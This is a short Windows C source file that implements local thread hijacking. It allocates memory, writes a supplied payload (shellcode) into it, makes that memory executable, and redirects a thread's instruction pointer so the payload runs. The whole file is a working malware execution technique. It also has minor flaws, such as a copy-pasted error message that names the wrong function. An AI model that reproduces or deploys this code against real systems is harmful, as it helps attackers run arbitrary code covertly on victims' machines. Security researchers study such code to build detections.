#include "ThreadHijacker.h"


int LocalThreadHijacking(HANDLE hThread, LPBYTE pPayload, SIZE_T szPayload) {

	CONTEXT ThreadCtx = { 0 };
	PVOID	pAddress = NULL;
	DWORD	dwOldProtectoion = 0;
	SIZE_T	NumberOfBytesWritten = 0;

	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	pAddress = VirtualAlloc(NULL, szPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pAddress) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(GetCurrentProcess(), pAddress, pPayload, szPayload, &NumberOfBytesWritten)) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n NumberOfBytesWritten: %ld", GetLastError(), NumberOfBytesWritten);
		return FALSE;
	}

	if (!VirtualProtect(pAddress, szPayload, PAGE_EXECUTE_READWRITE, &dwOldProtectoion)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}